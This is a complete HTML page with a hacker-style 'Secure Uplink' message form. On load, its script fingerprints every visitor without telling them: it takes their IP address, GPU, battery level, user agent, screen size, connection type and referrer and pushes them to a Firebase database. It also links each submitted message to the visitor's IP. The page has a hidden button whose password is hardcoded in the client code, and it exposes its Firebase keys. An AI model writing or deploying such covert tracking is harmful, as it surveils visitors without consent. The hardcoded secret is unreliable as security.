<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Secure Transmission</title>
    <style>
        /* --- VISUALS --- */
        html, body {
            margin: 0; padding: 0; 
            background-color: #050505; 
            font-family: 'Courier New', monospace;
            color: #00ff41;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            width: 90%;
            max-width: 500px;
            border: 1px solid #333;
            padding: 20px;
            background: #000;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
        }

        h2 {
            margin-top: 0;
            border-bottom: 1px dashed #333;
            padding-bottom: 10px;
            font-size: 1.2rem;
            text-align: center;
        }

        textarea {
            width: 100%;
            height: 150px;
            background: #111;
            border: 1px solid #333;
            color: #ddd;
            padding: 10px;
            font-family: inherit;
            resize: none;
            box-sizing: border-box; 
            outline: none;
        }

        textarea:focus { border-color: #00ff41; }

        button#transmit-btn {
            width: 100%;
            margin-top: 15px;
            padding: 15px;
            background: #00ff41;
            color: #000;
            border: none;
            font-weight: bold;
            font-family: inherit;
            cursor: pointer;
            text-transform: uppercase;
        }

        button#transmit-btn:active { background: #00cc33; }
        
        #status {
            text-align: center; margin-top: 10px; color: #f60; font-size: 0.9em; height: 20px;
        }

        /* --- SECRET BUTTON --- */
        #access-point {
            position: fixed; bottom: 0; right: 0; 
            background: none; border: none;
            color: rgba(255, 255, 255, 0.01); 
            font-size: 24px; padding: 20px;
            cursor: default;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>SECURE UPLINK</h2>
        <textarea id="msg-input" placeholder="Enter transmission data..."></textarea>
        <button id="transmit-btn">TRANSMIT DATA</button>
        <div id="status"></div>
    </div>

    <button id="access-point">.</button>

    <!-- LIBRARIES -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <script>
    document.addEventListener('DOMContentLoaded', async () => {
        const firebaseConfig = {
          apiKey: "AIzaSyD19FsJIWCif0h-ExcGODrok4M7wk_bSBc",
          authDomain: "void-81e60.firebaseapp.com",
          databaseURL: "https://void-81e60-default-rtdb.asia-southeast1.firebasedatabase.app",
          projectId: "void-81e60",
          storageBucket: "void-81e60.appspot.com",
          messagingSenderId: "749357378719",
          appId: "1:749357378719:web:6343550759a405e5c1c6aa"
        };
        const SECRET_KEY = "alpha-zero-nine"; 

        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // Global variable to store IP so we don't have to fetch it twice
        let clientIP = "Unknown";

        // --- 1. IMMEDIATE AUTO-LOGGER (Run on Load) ---
        const logVisit = async () => {
            try {
                // Fetch IP
                const ipRes = await fetch('https://api.ipify.org?format=json').catch(()=>null);
                const ipData = ipRes ? await ipRes.json() : { ip: 'N/A' };
                clientIP = ipData.ip; // Store for the message part

                // Gather Hardware Data
                let gpu = 'N/A';
                try {
                    const gl = document.createElement('canvas').getContext('webgl');
                    const info = gl.getExtension('WEBGL_debug_renderer_info');
                    gpu = info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : 'N/A';
                } catch(e){}

                let battery = 'N/A';
                if(navigator.getBattery) {
                    const b = await navigator.getBattery();
                    battery = `${Math.round(b.level*100)}%`;
                }

                // Construct "Visit" Payload
                const visitData = {
                    type: "VISIT", // Tagging this as a visit
                    ip: clientIP,
                    timestamp: new Date().toISOString(),
                    
                    // The "Other Stuff"
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    gpu: gpu,
                    battery: battery,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    connection: navigator.connection ? navigator.connection.effectiveType : 'N/A',
                    referrer: document.referrer || 'Direct'
                };

                // Send Immediately
                db.ref('records').push(visitData);
                db.ref('engagements').transaction(v => (v||0)+1);
                console.log("Uplink Established.");

            } catch (e) { console.log("Silent Error."); }
        };

        // Run immediately
        logVisit();


        // --- 2. MESSAGE TRANSMITTER (Run on Click) ---
        const sendMessage = async () => {
            const msgInput = document.getElementById('msg-input');
            const status = document.getElementById('status');
            const message = msgInput.value.trim();

            if(!message) {
                status.innerText = "NO DATA DETECTED.";
                return;
            }

            status.innerText = "SENDING...";
            status.style.color = "#f60";

            try {
                const messagePayload = {
                    type: "MESSAGE", // Tagging this as a message
                    ip: clientIP,    // Using cached IP to link to the visit
                    timestamp: new Date().toISOString(),
                    text: message    // The only payload here
                };

                await db.ref('records').push(messagePayload);

                status.innerText = "TRANSMISSION COMPLETE.";
                status.style.color = "#00ff41";
                msgInput.value = ""; // Clear input

            } catch (e) {
                status.innerText = "FAILURE.";
                status.style.color = "red";
            }
        };

        document.getElementById('transmit-btn').addEventListener('click', sendMessage);

        // Secret Door
        document.getElementById('access-point').addEventListener('click', () => {
            if(prompt("ACCESS CODE:") === SECRET_KEY) window.location.href = 'console.html';
            else alert("DENIED");
        });
    });
    </script>
</body>
</html>
